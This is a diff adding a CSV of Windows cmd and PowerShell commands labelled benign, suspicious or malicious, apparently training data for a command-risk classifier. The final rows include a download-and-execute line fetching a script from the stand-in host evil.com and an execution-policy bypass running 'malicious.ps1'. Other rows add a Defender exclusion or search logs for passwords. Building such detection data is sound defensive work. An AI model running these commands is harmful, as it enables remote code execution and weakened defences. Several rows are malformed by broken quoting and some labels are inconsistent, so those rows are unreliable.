@@ -1,0 +1,335 @@
+﻿prompt,Label
+ipconfig /all,suspicious
+netstat -an,suspicious
+tasklist,suspicious
+systeminfo,suspicious
+driverquery,suspicious
+ping google.com,benign
+tracert 8.8.8.8,benign
+path,benign
+set,benign
+getmac,suspicious
+whoami,suspicious
+hostname,benign
+shutdown /r /t 0,benign
+sfc /scannow,benign
+chkdsk C:,benign
+defrag C: /A,benign
+diskpart list disk,suspicious
+wevtutil qe Application /c:10 /rd:true /f:text,suspicious
+nslookup microsoft.com,benign
+arp -a,suspicious
+route print,suspicious
+gpresult /R,suspicious
+net user,suspicious
+net accounts,suspicious
+net localgroup,suspicious
+net share,suspicious
+net session,suspicious
+net start,benign
+"net stop ""Print Spooler""",benign
+net use L: \\server\share,benign
+net view,suspicious
+wmic product get name," version,suspicious"
+wmic process list brief,suspicious
+wmic qfe list brief,suspicious
+wmic os get Caption," Version,suspicious"
+wmic logicaldisk get name," description,suspicious"
+wmic useraccount list brief,suspicious
+wmic service list brief,suspicious
+wmic share get name," path,suspicious"
+wmic startup list brief,suspicious
+wmic timezone get caption,benign
+wmic desktopmonitor get screenheight," screenwidth,benign"
+wmic diskdrive get model," serialnumber,suspicious"
+wmic baseboard get product," manufacturer,suspicious"
+wmic cpu get name,suspicious
+wmic memorychip get capacity,suspicious
+wmic bios get serialnumber,suspicious
+wmic computersystem get name," manufacturer,suspicious"
+wmic onboot get description,suspicious
+wmic partition get name," size,suspicious"
+wmic shadowcopy list brief,suspicious
+wmic environment list brief,suspicious
+wmic group list brief,suspicious
+wmic nicconfig list brief,suspicious
+wmic ntdomain list brief,suspicious
+wmic printer list brief,benign
+"wmic process where name=""chrome.exe"" get processid",benign
+wmic recoveros get DebugInfoType,suspicious
+wmic sounddev list brief,benign
+wmic sysdriver list brief,suspicious
+wmic tapedeive list brief,suspicious
+wmic userdesktop list brief,suspicious
+wmic volume list brief,suspicious
+wmic volshadow list brief,suspicious
+fsutil fsinfo drives,suspicious
+compact /c C:\largefile.txt,benign
+cipher /w:C:,suspicious
+certutil -hashfile C:\file.exe SHA256,benign
+bitsadmin /list /allusers,suspicious
+at,suspicious
+schtasks /query /fo LIST /v,suspicious
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run,suspicious
+sc query,suspicious
+fltmc instances,suspicious
+openfiles /query /fo CSV,suspicious
+checknetisolation loopbackexempt -s,benign
+powercfg /list,benign
+control,benign
+explorer C:\,benign
+notepad C:\readme.txt,benign
+mspaint,benign
+calc,benign
+cmd,benign
+powershell,benign
+runas /user:administrator cmd.exe,suspicious
+type C:\windows\system32\drivers\etc\hosts,suspicious
+"findstr ""password"" *.log",suspicious
+sort file.txt,benign
+more file.txt,benign
+less file.txt,benign
+fc file1.txt file2.txt,benign
+expand file.cab -F:* .,benign
+extract file.cab,benign
+start chrome.exe,benign
+assoc .txt,benign
+ftype txtfile,benign
+color 0a,benign
+title My Command Prompt,benign
+ver,benign
+vol,benign
+"powershell -Command ""Get-Process""",suspicious
+"powershell -Command ""Get-Service""",suspicious
+"powershell -Command ""Get-ChildItem -Path C:\""",benign
+"powershell -Command ""Get-Help Get-Process""",benign
+"powershell -Command ""Get-Date""",benign
+"powershell -Command ""Start-Sleep -Seconds 5""",benign
+"powershell -Command ""Write-Host 'Hello"," World!'"",benign"
+"powershell -Command ""Get-WmiObject -Class Win32_OperatingSystem""",suspicious
+"powershell -Command ""Test-Connection -ComputerName google.com""",benign
+"powershell -Command ""Resolve-DnsName -Name microsoft.com""",benign
+"powershell -Command ""(Get-Item C:\Windows).CreationTime""",benign
+"powershell -Command ""Get-Location""",benign
+"powershell -Command ""Set-Location C:\""",benign
+"powershell -Command ""New-Item -ItemType file -Path '.\newfile.txt'""",benign
+"powershell -Command ""Copy-Item -Path '.\file1.txt' -Destination '.\file2.txt'""",benign
+"powershell -Command ""Move-Item -Path '.\old.txt' -Destination '.\new.txt'""",benign
+"powershell -Command ""Rename-Item -Path '.\file.txt' -NewName 'renamed.txt'""",benign
+"powershell -Command ""Clear-Content -Path '.\log.txt'""",benign
+"powershell -Command ""Get-Content -Path '.\config.ini'""",benign
+"powershell -Command ""Add-Content -Path '.\log.txt' -Value 'New log entry'""",benign
+"powershell -Command ""Set-Content -Path '.\status.txt' -Value 'Completed'""",benign
+"powershell -Command ""Get-Acl -Path 'C:\Windows'""",suspicious
+"powershell -Command ""Get-Command -Module NetTCPIP""",suspicious
+"powershell -Command ""Get-EventLog -LogName System -Newest 5""",suspicious
+"powershell -Command ""Get-HotFix""",suspicious
+"powershell -Command ""Get-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion'""",suspicious
+"powershell -Command ""Get-Member -InputObject 'hello'""",benign
+"powershell -Command ""Get-Module -ListAvailable""",suspicious
+"powershell -Command ""Get-Random""",benign
+"powershell -Command ""Get-TimeZone""",benign
+"powershell -Command ""Get-Verb""",benign
+"powershell -Command ""Get-Volume""",suspicious
+"powershell -Command ""Measure-Command { Get-Process }""",benign
+"powershell -Command ""Start-Process -FilePath 'notepad.exe'""",benign
+"powershell -Command ""Stop-Process -Name 'notepad.exe'""",benign
+"powershell -Command ""Wait-Process -Name 'notepad.exe'""",benign
+"powershell -Command ""ConvertTo-Html -InputObject (Get-Process)""",benign
+"powershell -Command ""Select-String -Path '*.log' -Pattern 'Error'""",suspicious
+"powershell -Command ""Out-File -FilePath '.\processes.txt' -InputObject (Get-Process)""",benign
+"powershell -Command ""Compare-Object -ReferenceObject (Get-Content file1.txt) -DifferenceObject (Get-Content file2.txt)""",benign
+"powershell -Command ""Export-Csv -Path '.\services.csv' -InputObject (Get-Service)""",benign
+"powershell -Command ""Import-Csv -Path '.\services.csv'""",benign
+"powershell -Command ""ForEach-Object { $_.Name } -InputObject (Get-Service)""",benign
+"powershell -Command ""Where-Object { $_.Status -eq 'Running' } -InputObject (Get-Service)""",benign
+"powershell -Command ""Sort-Object -Property Name -InputObject (Get-Service)""",benign
+"powershell -Command ""Select-Object -First 5 -InputObject (Get-Process)""",benign
+"powershell -Command ""Group-Object -Property Status -InputObject (Get-Service)""",benign
+"powershell -Command ""Get-History""",suspicious
+"powershell -Command ""Invoke-History""",suspicious
+"powershell -Command ""Get-PSDrive""",benign
+"powershell -Command ""Get-PSProvider""",benign
+"powershell -Command ""Test-Path -Path 'C:\Windows'""",benign
+"powershell -Command ""Join-Path -Path 'C:\Users' -ChildPath 'Admin'""",benign
+"powershell -Command ""Split-Path -Path 'C:\Windows\System32\kernel32.dll'""",benign
+"powershell -Command ""ConvertFrom-Json -InputObject '{\""name\"":\""test\""}'""",benign
+"powershell -Command ""ConvertTo-Json -InputObject (Get-Process)""",benign
+"powershell -Command ""Invoke-WebRequest -Uri 'https://google.com'""",suspicious
+"powershell -Command ""Invoke-RestMethod -Uri 'https://api.github.com/users/octocat'""",suspicious
+"powershell -Command ""New-WebServiceProxy -Uri 'http://www.webservicex.net/stockquote.asmx?WSDL'""",suspicious
+"powershell -Command ""Send-MailMessage -To 'user@example.com' -Subject 'Test' -Body 'Test email'""",suspicious
+"powershell -Command ""Get-NetIPAddress""",suspicious
+"powershell -Command ""Get-NetAdapter""",suspicious
+"powershell -Command ""Get-NetRoute""",suspicious
+"powershell -Command ""New-NetFirewallRule -DisplayName 'Block HTTP' -Direction Outbound -Action Block -Protocol TCP -LocalPort 80""",suspicious
+"powershell -Command ""Get-DnsClientServerAddress""",suspicious
+"powershell -Command ""Register-DnsClient""",suspicious
+"powershell -Command ""Set-DnsClientServerAddress -InterfaceIndex 12 -ServerAddresses ('1.1.1.1'","'8.8.8.8')"",suspicious"
+"powershell -Command ""Start-BitsTransfer -Source 'http://example.com/file.zip' -Destination 'C:\downloads'""",suspicious
+"powershell -Command ""Add-MpPreference -ExclusionPath 'C:\temp'""",suspicious
+"powershell -Command ""Get-WindowsUpdateLog""",suspicious
+"powershell -Command ""Get-ComputerInfo""",suspicious
+"powershell -Command ""Get-Clipboard""",suspicious
+"powershell -Command ""Set-Clipboard -Value 'some text'""",benign
+"powershell -Command ""Read-Host -Prompt 'Enter your name'""",benign
+"powershell -Command ""Write-Progress -Activity 'Copying files' -Status '35% Complete' -PercentComplete 35""",benign
+"powershell -Command ""Write-Warning 'This is a warning.'""",benign
+"powershell -Command ""Write-Error 'This is an error.'""",benign
+"powershell -Command ""Write-Verbose 'This is a verbose message.'""",benign
+"powershell -Command ""Write-Debug 'This is a debug message.'""",benign
+"powershell -Command ""Enter-PSSession -ComputerName Server01""",suspicious
+"powershell -Command ""Exit-PSSession""",benign
+"powershell -Command ""Invoke-Command -ComputerName Server01 -ScriptBlock { Get-Process }""",suspicious
+"powershell -Command ""Enable-PSRemoting -Force""",suspicious
+"powershell -Command ""New-PSSessionOption -IdleTimeout 3600000""",suspicious
+"powershell -Command ""Register-PSSessionConfiguration -Name 'LimitedSession' -StartupScript 'C:\scripts\init.ps1'""",suspicious
+"powershell -Command ""Set-PSSessionConfiguration -Name 'LimitedSession' -ShowSecurityDescriptorUI""",suspicious
+"powershell -Command ""Get-PSSessionConfiguration""",suspicious
+"powershell -Command ""Unregister-PSSessionConfiguration -Name 'LimitedSession'""",suspicious
+"powershell -Command ""Disable-PSSessionConfiguration -Name 'Microsoft.PowerShell'""",suspicious
+"powershell -Command ""Enable-PSSessionConfiguration -Name 'Microsoft.PowerShell'""",suspicious
+"powershell -Command ""Get-PSSessionCapability -ConfigurationName 'Microsoft.PowerShell'""",suspicious
+"powershell -Command ""New-PSTransportOption -MaxIdleTimeoutSec 300""",suspicious
+"powershell -Command ""Get-Runspace""",suspicious
+"powershell -Command ""Debug-Process -Name 'powershell'""",suspicious
+"powershell -Command ""Set-PSDebug -Trace 1""",suspicious
+"powershell -Command ""Trace-Command -Name 'ParameterBinding' -Expression { Get-Process } -PSHost""",suspicious
+"powershell -Command ""Update-Help""",benign
+"powershell -Command ""Save-Help -DestinationPath 'C:\help'""",benign
+"powershell -Command ""Get-PSBreakpoint""",suspicious
+"powershell -Command ""Set-PSBreakpoint -Script 'myscript.ps1' -Line 10""",suspicious
+"powershell -Command ""Enable-PSBreakpoint -Id 0""",suspicious
+"powershell -Command ""Disable-PSBreakpoint -Id 0""",suspicious
+"powershell -Command ""Remove-PSBreakpoint -Id 0""",suspicious
+"powershell -Command ""Get-Variable""",benign
+"powershell -Command ""Set-Variable -Name 'myvar' -Value 'hello'""",benign
+"powershell -Command ""Clear-Variable -Name 'myvar'""",benign
+"powershell -Command ""Remove-Variable -Name 'myvar'""",benign
+"powershell -Command ""Get-Alias""",benign
+"powershell -Command ""Set-Alias -Name 'list' -Value 'Get-ChildItem'""",benign
+"powershell -Command ""Export-Alias -Path '.\aliases.txt'""",benign
+"powershell -Command ""Import-Alias -Path '.\aliases.txt'""",benign
+"powershell -Command ""Get-Function""",benign
+"powershell -Command ""Get-Content function:\prompt""",suspicious
+"powershell -Command ""Get-Help about_Functions""",benign
+"powershell -Command ""Get-Help about_Execution_Policies""",benign
+"powershell -Command ""Set-ExecutionPolicy RemoteSigned""",suspicious
+"powershell -Command ""Get-ExecutionPolicy -List""",suspicious
+"powershell -Command ""Get-Help about_Profiles""",benign
+"powershell -Command ""Test-Path $PROFILE""",benign
+"powershell -Command ""New-Item -Type file -Path $PROFILE -Force""",benign
+"powershell -Command ""notepad $PROFILE""",benign
+"powershell -Command ""Get-Help about_Signing""",benign
+"powershell -Command ""Get-PfxCertificate -FilePath '.\mycert.pfx'""",suspicious
+"powershell -Command ""Set-AuthenticodeSignature -FilePath '.\myscript.ps1' -Certificate $cert""",suspicious
+"powershell -Command ""Get-AuthenticodeSignature -FilePath '.\myscript.ps1'""",suspicious
+"powershell -Command ""Get-Help about_Regular_Expressions""",benign
+"powershell -Command ""'hello' -match '^h'""",benign
+"powershell -Command ""Get-Help about_Operators""",benign
+"powershell -Command ""Get-Help about_Variables""",benign
+"powershell -Command ""Get-Help about_Arrays""",benign
+"powershell -Command ""Get-Help about_Hash_Tables""",benign
+"powershell -Command ""Get-Help about_If""",benign
+"powershell -Command ""Get-Help about_Switch""",benign
+"powershell -Command ""Get-Help about_For""",benign
+"powershell -Command ""Get-Help about_ForEach""",benign
+"powershell -Command ""Get-Help about_While""",benign
+"powershell -Command ""Get-Help about_Do""",benign
+"powershell -Command ""Get-Help about_Break""",benign
+"powershell -Command ""Get-Help about_Continue""",benign
+"powershell -Command ""Get-Help about_Return""",benign
+"powershell -Command ""Get-Help about_Try_Catch_Finally""",benign
+"powershell -Command ""Get-Help about_Throw""",benign
+"powershell -Command ""Get-Help about_Trap""",benign
+"powershell -Command ""Get-Help about_Scopes""",benign
+"powershell -Command ""Get-Help about_Script_Blocks""",benign
+"powershell -Command ""Get-Help about_Classes""",benign
+"powershell -Command ""Get-Help about_Enum""",benign
+"powershell -Command ""Get-Help about_DesiredStateConfiguration""",benign
+"powershell -Command ""Get-DscResource""",suspicious
+"powershell -Command ""Get-DscConfiguration""",suspicious
+"powershell -Command ""Start-DscConfiguration -Path '.\MyConfig' -Wait -Verbose""",suspicious
+"powershell -Command ""Test-DscConfiguration""",suspicious
+"powershell -Command ""Get-DscConfigurationStatus""",suspicious
+"powershell -Command ""Stop-DscConfiguration""",suspicious
+"powershell -Command ""Remove-DscConfigurationDocument -Stage Current""",suspicious
+"powershell -Command ""Restore-DscConfiguration""",suspicious
+"powershell -Command ""Get-DscLocalConfigurationManager""",suspicious
+"powershell -Command ""Set-DscLocalConfigurationManager -Path '.\MetaConfig.mof'""",suspicious
+"powershell -Command ""Publish-DscConfiguration -Path '.\MyConfig' -ComputerName 'server.domain.com'""",suspicious
+"powershell -Command ""Update-DscConfiguration -ComputerName 'server.domain.com'""",suspicious
+"powershell -Command ""Get-Help about_Modules""",benign
+"powershell -Command ""Get-Module""",suspicious
+"powershell -Command ""Import-Module -Name 'ActiveDirectory'""",suspicious
+"powershell -Command ""Remove-Module -Name 'ActiveDirectory'""",suspicious
+"powershell -Command ""New-Module -Name 'MyModule' -ScriptBlock { function MyFunc { 'Hello' } }""",benign
+"powershell -Command ""Export-ModuleMember -Function * -Alias *""",benign
+"powershell -Command ""Get-Module -ListAvailable""",suspicious
+"powershell -Command ""Find-Module -Name 'Pester'""",suspicious
+"powershell -Command ""Install-Module -Name 'Pester' -Scope CurrentUser""",suspicious
+"powershell -Command ""Update-Module -Name 'Pester'""",suspicious
+"powershell -Command ""Uninstall-Module -Name 'Pester'""",suspicious
+"powershell -Command ""Save-Module -Name 'Pester' -Path 'C:\modules'""",suspicious
+"powershell -Command ""Publish-Module -Name 'MyModule' -NuGetApiKey 'mykey'""",suspicious
+"powershell -Command ""Register-PSRepository -Name 'MyRepo' -SourceLocation 'https://myrepo.com/api/v2'""",suspicious
+"powershell -Command ""Set-PSRepository -Name 'MyRepo' -InstallationPolicy Trusted""",suspicious
+"powershell -Command ""Get-PSRepository""",suspicious
+"powershell -Command ""Unregister-PSRepository -Name 'MyRepo'""",suspicious
+"powershell -Command ""Find-Script -Name 'Install-Something'""",suspicious
+"powershell -Command ""Install-Script -Name 'Install-Something'""",suspicious
+"powershell -Command ""Update-Script -Name 'Install-Something'""",suspicious
+"powershell -Command ""Uninstall-Script -Name 'Install-Something'""",suspicious
+"powershell -Command ""Save-Script -Name 'Install-Something' -Path 'C:\scripts'""",suspicious
+"powershell -Command ""Publish-Script -Name 'MyScript' -NuGetApiKey 'mykey'""",suspicious
+"powershell -Command ""Get-Help about_Jobs""",benign
+"powershell -Command ""Start-Job -ScriptBlock { Get-Process }""",suspicious
+"powershell -Command ""Get-Job""",suspicious
+"powershell -Command ""Receive-Job -Id 1""",suspicious
+"powershell -Command ""Wait-Job -Id 1""",suspicious
+"powershell -Command ""Stop-Job -Id 1""",suspicious
+"powershell -Command ""Remove-Job -Id 1""",suspicious
+"powershell -Command ""Start-ThreadJob -ScriptBlock { Get-Process }""",suspicious
+"powershell -Command ""Register-ObjectEvent -InputObject (New-Object System.IO.FileSystemWatcher) -EventName 'Created' -SourceIdentifier 'FileCreated' -Action { Write-Host 'File Created!' }""",suspicious
+"powershell -Command ""Unregister-Event -SourceIdentifier 'FileCreated'""",suspicious
+"powershell -Command ""Get-Event""",suspicious
+"powershell -Command ""Get-EventSubscriber""",suspicious
+"powershell -Command ""Remove-Event -SourceIdentifier 'FileCreated'""",suspicious
+"powershell -Command ""New-Event -SourceIdentifier 'MyEvent' -MessageData 'Something happened'""",suspicious
+"powershell -Command ""Wait-Event -SourceIdentifier 'MyEvent'""",suspicious
+"powershell -Command ""Get-Help about_Transactions""",benign
+"powershell -Command ""Start-Transaction""",benign
+"powershell -Command ""Complete-Transaction""",benign
+"powershell -Command ""Undo-Transaction""",benign
+"powershell -Command ""Use-Transaction""",benign
+"powershell -Command ""Get-Transaction""",benign
+"powershell -Command ""Get-Help about_Providers""",benign
+"powershell -Command ""Get-ChildItem HKCU:\Software""",suspicious
+"powershell -Command ""Get-ChildItem Env:\""",suspicious
+"powershell -Command ""Get-ChildItem Alias:\""",suspicious
+"powershell -Command ""Get-ChildItem Function:\""",suspicious
+"powershell -Command ""Get-ChildItem Variable:\""",suspicious
+"powershell -Command ""Get-ChildItem Cert:\CurrentUser\My""",suspicious
+"powershell -Command ""Get-ChildItem WSMan:\localhost\Plugin""",suspicious
+"powershell -Command ""Get-Help about_Debuggers""",benign
+"powershell -Command ""Enter-PSHostProcess -Id 1234""",suspicious
+"powershell -Command ""Exit-PSHostProcess""",benign
+"powershell -Command ""Get-PSHostProcessInfo""",suspicious
+"powershell -Command ""Debug-Runspace -Id 1""",suspicious
+"powershell -Command ""Enable-RunspaceDebug -Runspace (Get-Runspace 1)""",suspicious
+"powershell -Command ""Disable-RunspaceDebug -Runspace (Get-Runspace 1)""",suspicious
+"powershell -Command ""Get-RunspaceDebug""",suspicious
+"powershell -Command ""Set-StrictMode -Version Latest""",benign
+"powershell -Command ""Get-StrictMode""",benign
+"powershell -Command ""$ErrorActionPreference = 'Stop'""",benign
+"powershell -Command ""$PSDefaultParameterValues['*:Verbose'] = $true""",benign
+"powershell -Command ""$FormatEnumerationLimit = -1""",benign
+"powershell -Command ""$MaximumHistoryCount = 1000""",benign
+"powershell -Command ""Get-PSCallStack""",suspicious
+"powershell -Command ""Get-Culture""",benign
+"powershell -Command ""Get-UICulture""",benign
+"powershell -Command ""[System.Threading.Thread]::CurrentThread.CurrentCulture = 'fr-FR'""",benign
+"powershell -Command ""Clear-Host""",benign
+"powershell -Command ""exit""",benign
+powershell -ExecutionPolicy Bypass -File C:\temp\malicious.ps1,malicious
+"powershell ""IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')""",malicious
